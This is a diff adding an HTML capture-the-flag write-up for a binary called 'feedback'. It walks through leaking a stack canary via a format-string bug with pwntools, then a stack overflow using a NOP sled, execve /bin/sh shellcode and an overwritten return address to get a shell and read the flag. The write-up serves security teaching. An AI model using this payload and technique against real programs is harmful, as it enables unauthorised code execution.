@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>feedback</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <h1 align="center">CTF2</h1>
+  <h2 class="qsn">feedback</h2>
+  <h5>binary and flag files can be found <a href="">here</a></h5>  
+  <p>'C' code is not given.We are provided only with binary and flag file(which is not directly accessible,obiviously).We disassemble the 'main' function with gdb first:
+  <pre class="code">gdb-peda$ disas main 
+Dump of assembler code for function main:
+   0x08048673 <+0>:	push   ebp
+   0x08048674 <+1>:	mov    ebp,esp
+   0x08048676 <+3>:	and    esp,0xfffffff0
+   0x08048679 <+6>:	sub    esp,0x10
+   0x0804867c <+9>:	mov    eax,ds:0x804a040
+   0x08048681 <+14>:	mov    DWORD PTR [esp+0x4],0x0
+   0x08048689 <+22>:	mov    DWORD PTR [esp],eax
+   0x0804868c <+25>:	call   0x8048420 &ltsetbuf@plt&gt
+   0x08048691 <+30>:	call   0x80485ad &ltgetName&gt
+   0x08048696 <+35>:	call   0x8048616 &ltsubmitFeedback&gt
+   0x0804869b <+40>:	mov    eax,0x0
+   0x080486a0 <+45>:	leave  
+   0x080486a1 <+46>:	ret    
+End of assembler dump.</pre>
+So,we have three functions being called. <b>setbuf</b> is an inbuilt function (guessed by '@plt' in the end).Next,we disassemble  <b>getname</b> and <b>submitFeedback</b> functions.
+<pre class="code">gdb-peda$ disas getName 
+Dump of assembler code for function getName:
+   0x080485ad <+0>:	push   ebp
+   0x080485ae <+1>:	mov    ebp,esp
+   0x080485b0 <+3>:	sub    esp,0x88
+   0x080485b6 <+9>:	mov    eax,gs:0x14
+   0x080485bc <+15>:	mov    DWORD PTR [ebp-0xc],eax
+   0x080485bf <+18>:	xor    eax,eax
+   0x080485c1 <+20>:	mov    DWORD PTR [esp],0x8048740
+   0x080485c8 <+27>:	call   0x8048440 <printf@plt>
+   0x080485cd <+32>:	lea    eax,[ebp-0x70]
+   0x080485d0 <+35>:	mov    DWORD PTR [esp+0x4],eax
+   0x080485d4 <+39>:	mov    DWORD PTR [esp],0x8048757
+   0x080485db <+46>:	call   0x80484a0 <__isoc99_scanf@plt>
+   0x080485e0 <+51>:	mov    DWORD PTR [esp],0x804875c
+   0x080485e7 <+58>:	call   0x8048440 <printf@plt>
+   0x080485ec <+63>:	lea    eax,[ebp-0x70]
+   0x080485ef <+66>:	mov    DWORD PTR [esp],eax
+   0x080485f2 <+69>:	call   0x8048440 <printf@plt>
+   0x080485f7 <+74>:	mov    DWORD PTR [esp],0xa
+   0x080485fe <+81>:	call   0x8048490 <putchar@plt>
+   0x08048603 <+86>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048606 <+89>:	xor    eax,DWORD PTR gs:0x14
+   0x0804860d <+96>:	je     0x8048614 <getName+103>
+   0x0804860f <+98>:	call   0x8048450 <__stack_chk_fail@plt>
+   0x08048614 <+103>:	leave  
+   0x08048615 <+104>:	ret    
+End of assembler dump.
+</pre><br/>
+We can see that the program uses <a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries"><b>canary value</b></a> protection, which we need to bypaas to get access to return address.
+<table>
+<pre>.
+.
+.
+.
+.
+.
+.
+.
+</pre>
+
+
+</table>
+When we run the program ,it asks for name.If we give our input as <b>%b</b>, it prints some some random value (not actually random, it's the value stored on the top of stack):
+<pre class="code">ctf2@ip-172-31-4-22:~/feedback$ ./feedback 
+Enter your name here: %d
+Welcome to Feedback Submission Portal -10616
+Enter your feedback here:</pre>,
+instead of our input ,in the last.This means,there a format string vulnerability.We will use it to find the canary value.As from the table above, we can calculate that. from <b>esp</b> to <b>canary</b> plus <b>4 bytes of canary</b> together ,make <b>128 bytes</b>.So we are going to print 128bytes from stack.
+We will work with <a href=""><b>pwntools</b></a> ,a python module specially build for this purpose.
+  <pre class="code">ctf2@ip-172-31-4-22:~/feedback$ python
+Python 2.7.6 (default, Oct 26 2016, 20:30:19) 
+[GCC 4.8.4] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+>>> p=process('./feedback')
+[x] Starting local process './feedback'
+[+] Starting local process './feedback': pid 9089
+>>></pre>
+We have started the process, we can send our input like below:
+<pre class="code">>>> p.sendline('%llx,'*16)
+>>> p.recv()
+'Enter your name here: Welcome to Feedback Submission Portal f7fcfb08ffffd688,ffffd6e000000000,786c6c25f7fcfac0,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,
+786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,ffffd7002c786c6c,f7fcfac0f7e8d0df,
+200000000000,f7fcfac0a5f29700,\nEnter your feedback here: '
+>>> 
+</pre>
+The last four byte is our canary value i.e 0xa5f29700 which changes everytime the code runs.<br/>Now it's the time to think of our next input.For that,we need to look at the disassembled code for <b>submitFeedback</b> function:
+<pre class="code">gdb-peda$ disas submitFeedback 
+Dump of assembler code for function submitFeedback:
+   0x08048616 <+0>:	push   ebp
+   0x08048617 <+1>:	mov    ebp,esp
+   0x08048619 <+3>:	sub    esp,0x238
+   0x0804861f <+9>:	mov    eax,gs:0x14
+   0x08048625 <+15>:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048628 <+18>:	xor    eax,eax
+   0x0804862a <+20>:	mov    DWORD PTR [esp],0x8048783
+   0x08048631 <+27>:	call   0x8048440 &ltprintf@plt&gt
+   0x08048636 <+32>:	mov    DWORD PTR [esp+0x8],0x246
+   0x0804863e <+40>:	lea    eax,[ebp-0x21c]
+   0x08048644 <+46>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048648 <+50>:	mov    DWORD PTR [esp],0x0
+   0x0804864f <+57>:	call   0x8048430 &ltread@plt&gt
+   0x08048654 <+62>:	mov    DWORD PTR [esp],0x804879e
+   0x0804865b <+69>:	call   0x8048460 &ltputs@plt&gt
+   0x08048660 <+74>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048663 <+77>:	xor    eax,DWORD PTR gs:0x14
+   0x0804866a <+84>:	je     0x8048671 &ltsubmitFeedback+91&gt
+   0x0804866c <+86>:	call   0x8048450 &lt__stack_chk_fail@pl&gt>
+   0x08048671 <+91>:	leave  
+   0x08048672 <+92>:	ret    
+End of assembler dump.
+</pre>
+Stack structure:
+<table>
+<pre>.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+</pre>
+</table>
+This shows our input should be in this format:<br/><br/>
+<i>..528byte something..  +  ..4byte canary..  +  ...8byte+4byte(ebp) something...  +  ...4byte return address...</i><br/><br/>
+In those 528byte ,we will be putting our shellcode.And overwrite the return address with the address of shellcode, so that our program executes our shellcode.<br/>
+Let's play with shellcode now,better find one from internet,or can also write youself. I got mine from <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">here</a>.
+<pre class="code">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</pre>
+This is a shellcode for making a <b>system call to /bin/sh</b> ,hence giving us the root access.
+At my machine,my next input was:
+<pre class="code">p.sendline("\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"a"*300+"\x00\x65\x6a\xb9"+"a"*12+"\x10\xd5\xff\xff")</pre>
+Let's undersatnd how:<br/>
+<ol>
+<li>In starting ,there are 200 <b><a href="https://en.wikipedia.org/wiki/NOP">nop</a></b>s ("\x90" in hex),which means if I provide returns address to somewhere between <b>nop</b>s ,it will slide silently till it finds the shellcode.</li>
+<li>Then comes my shellcode, which is 28byte in size, and then 300byte <b>"a"</b>s to fill the space, hence making a total of 528bytes till now.</li>
+<li title="Remember it changes at every execution.">Then ,the canary value, which we found after first input.</li>
+<li>12bytes of filling stuff, and then the return address to somewhere between those <b>nop</b>s. Well, <b>nop</b>s start at address <b>ebp-0x21c</b>(address of our input) </li> ,so I added few bytes to that address and gave it as return address.
+</ol> 
+<pre class="code">>>> p.sendline("\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"a"*300+"\x00\x65\x6a\xb9"+"a"*12+"\x10\xd5\xff\xff")
+>>> p.recv()
+'Thank You\n'
+>>> </pre>
+This gives us root access, now we can do whatever we want, with the flag (I prefer dance :p).
+<pre class="code">>>> p.sendline('/bin/cat flag')
+>>> p.recv()
+'C4/\/aR1$_4r3_$h1t\n\n'
+>>> 
+</pre>
+</p>
+<div><img src="https://1.bp.blogspot.com/-u_Xh1dSVAHk/VtthmWM8KLI/AAAAAAAASSw/ccJPxavqS8I/s1600/smiley-with-pencil.jpg" width="140" height="100"/> 
+</div>
+<div><pre class="signature">      Amityadav</pre></div>  
+
+<!--http://liveweave.com/TFfy4N-->
+</body>
+</html>
